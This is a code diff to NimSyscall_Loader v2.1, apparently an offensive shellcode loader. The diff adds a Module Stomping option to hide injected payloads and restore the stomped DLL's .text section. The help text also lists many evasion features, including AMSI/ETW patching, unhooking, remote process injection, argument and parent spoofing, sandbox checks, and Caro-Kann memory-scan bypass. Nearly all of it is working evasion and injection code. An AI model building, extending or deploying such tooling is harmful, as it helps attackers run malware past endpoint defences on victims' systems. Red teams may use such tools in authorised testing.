@@ -67,7 +67,7 @@ let helpmenu = """
 NimSyscall_Loader v 2.1
 
 Usage:
-  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --mapSection --unhook --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate --dripsleep=<sleeptime-ms> --stegofile=<filepath> --ruy-lopez --threadless --threadlessDll=<dllname.dll> --threadlessFunc=<dllfunc> --Caro-Kann]
+  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --mapSection --unhook --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate --dripsleep=<sleeptime-ms> --stegofile=<filepath> --ruy-lopez --threadless --threadlessDll=<dllname.dll> --threadlessFunc=<dllfunc> --Caro-Kann --stomb --stombDll=<dllname.dll> --stombFunc=<dllfunc> --stombFunc2=<dllfunc2> --restore]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -188,6 +188,11 @@ Options:
       --threadlessDll dllname    Specify a DLL to use for the Threadless inject hook
       --threadlessFunc dllfunc    Specify a function to use for the Threadless inject hook
   --Caro-Kann    Use Caro-Kann technique to bypass initial memory scan detections by injecting a second shellcode which sleeps and decrypts (https://github.com/S3cur3Th1sSh1t/Caro-Kann)  
+  --stomb    Enable Module Stomping to not do memory allocations. By default, 'chakra.dll' is loaded and stomped.
+      --stombDll dllname    Specify a DLL to use for the Module Stomping (default is 'chakra.dll')
+      --stombFunc dllfunc    Specify a function to use for the Module Stomping
+      --stombFunc2 dllfunc2    Specify a second function to use for the Module Stomping. Only needed if you combine Caro-Kann with Module Stomping as there are two shellcodes than
+      --restore    Using this option will restore the .text section of the stomped DLL after executing the shellcode. That way, you get rid of Module Stomp IoCs. But this option only works with Payloads, that are reflective DLLs or which create a new thread.
 
 [PE Packing]
 
@@ -324,6 +329,11 @@ var
     threadlessFunc: string = "NtWaitForMultipleObjects" # called regularly by RuntimeBroker.exe which is default spawn inject target.
     suspended: bool = true
     carokann: bool = false
+    stomb: bool = false
+    stombDll: string = "chakra.dll"
+    stombFunc: string = "MemProtectHeapUnprotectCurrentThread"
+    stombFunc2: string = "DllCanUnloadNow"
+    restore: bool = false
 
 let args = docopt(helpmenu, version = "NimSyscall_Loader 2.1")
 
@@ -680,9 +690,10 @@ if args["--noDInvoke"]:
 
 if args["--threadless"]:
     threadless = true
-    localCreateThread = false
-    useQueueAPC = false
-    callbackexecute = false
+    if(remoteinject):
+        localCreateThread = false
+        useQueueAPC = false
+        callbackexecute = false
     suspended = false
 
 if args["--threadlessDll"]:
@@ -695,6 +706,12 @@ if args["--threadlessFunc"]:
 
 if args["--Caro-Kann"]:
     carokann = true
+
+if args["--stomb"]:
+    stomb = true
+
+if args["--restore"]:
+    restore = true
 
 var blob: string
 
@@ -984,10 +1001,10 @@ if(carokann):
         randomKey[i] = byte(rand(int(0x00) .. int(0xFF)))
     
     # put the bytes byte 0xAC, 0xF4, 0x0F, 0x96 into the randomKey sequence
-    #randomKey[0] = 0xAC
-    #randomKey[1] = 0xF4
-    #randomKey[2] = 0x0F
-    #randomKey[3] = 0x96 # only for testing purposes
+    randomKey[0] = 0x14
+    randomKey[1] = 0xFF
+    randomKey[2] = 0x13
+    randomKey[3] = 0xDE # only for testing purposes
 
     # Now we need to search for the egg and replace it with the random key. The resulting shellcode will be written to disk as decryptprotect.bin.tmp
     var eggIndex = 0
@@ -1002,6 +1019,16 @@ if(carokann):
     hookShellcodeBytes[eggIndex+1] = randomKey[1]
     hookShellcodeBytes[eggIndex+2] = randomKey[2]
     hookShellcodeBytes[eggIndex+3] = randomKey[3]
+
+    eggIndex = 0
+    for i in 0 ..< hookShellcodeBytes.len:
+        if (hookShellcodeBytes[i] == 0xDE) and (hookShellcodeBytes[i+1] == 0xAD) and (hookShellcodeBytes[i+2] == 0x10) and (hookShellcodeBytes[i+3] == 0xAF):
+            eggIndex = i
+            break
+
+    var shellcodeSize: DWORD = cast[DWORD](data.len)
+    copyMem(unsafeAddr hookShellcodeBytes[eggIndex], unsafeAddr shellcodeSize, 4)
+
 
     writeFile("decryptprotect.bin.tmp", toString(hookShellcodeBytes))
 
@@ -1806,10 +1833,14 @@ when defined(sleep):
     import times
 
 when defined(threadless):
-    import Utils
+    from Utils import GetRemoteProcAddress, GetRemoteModuleHandle
 
 when defined(AllocateDripStyle):
     import Utils
+
+when defined(stomb):
+    from Utils import GetRemoteProcAddress, GetRemoteModuleHandle
+    var module: HMODULE
 
 when defined(SelfDelete):
     # Don't want to import the everything from winim, only what's really needed
@@ -2078,9 +2109,22 @@ when defined(Stego):
             shellcode: seq[byte] = extractBytes(c, a)
         return shellcode
 
+var cfgspawn: bool = false
+
 when defined(threadless):
     const threadlessDLL = obf("{threadlessDll}") 
     const threadlessFunction = obf("{threadlessFunc}")
+    cfgspawn = true
+
+when defined(stomb):
+    const DLLPATH: cstring = obf("{stombDll}")
+    var stombDll = obf("{stombDll}")
+    var stombFunc = obf("{stombFunc}")
+    var rPtr2: LPVOID
+    cfgspawn = true
+    when defined(carokann):
+        var stombFunc2 = obf("{stombFunc2}")
+    
 
 when defined(carokann):
     var originalscLength: DWORD = {originalScLength}
@@ -2627,7 +2671,7 @@ let NotepadProcIDStub * = fmt"""
         when defined(suspended): 
             flags = flags or CREATE_SUSPENDED
         
-        when defined(threadless): # for some reasson CFG kicks in, when we execute threadlessinject style into a newly spawned process
+        if(cfgspawn): # for some reasson CFG kicks in, when we execute threadlessinject style into a newly spawned process
             
             InitializeProcThreadAttributeList(NULL, 2, 0, addr lpSize)
             si.lpAttributeList = cast[LPPROC_THREAD_ATTRIBUTE_LIST](HeapAlloc(GetProcessHeap(), 0, lpSize))
@@ -3028,6 +3072,10 @@ if (retrieveFromFile):
 elif (retrieveFromURL):
     stub.add(ShellcodefromURLStub)
 
+# if remoteinject and remotepatchamsi or threadlessinject
+if (remoteinject and (remoteAMSIpatch or stomb)):
+    stub.add(RemoteLoadDllStub)
+
 # Only decrypt when sandbox Checks/Unhooking/Sleep is done
 stub.add(getRandStub())
 stub.add(Cryptstub2)
@@ -3331,6 +3379,12 @@ elif (retrieveFromURL):
     stub.add(ShellcodefromURLStub)
 else:
     basicCompileFlags.add("-d:PayloadEmbedded ")
+
+if(stomb):
+    basicCompileFlags.add("-d:stomb ")
+
+if(restore):
+    basicCompileFlags.add("-d:restore ")
 
 if (carokann):
     basicCompileFlags.add("-d:carokann ")
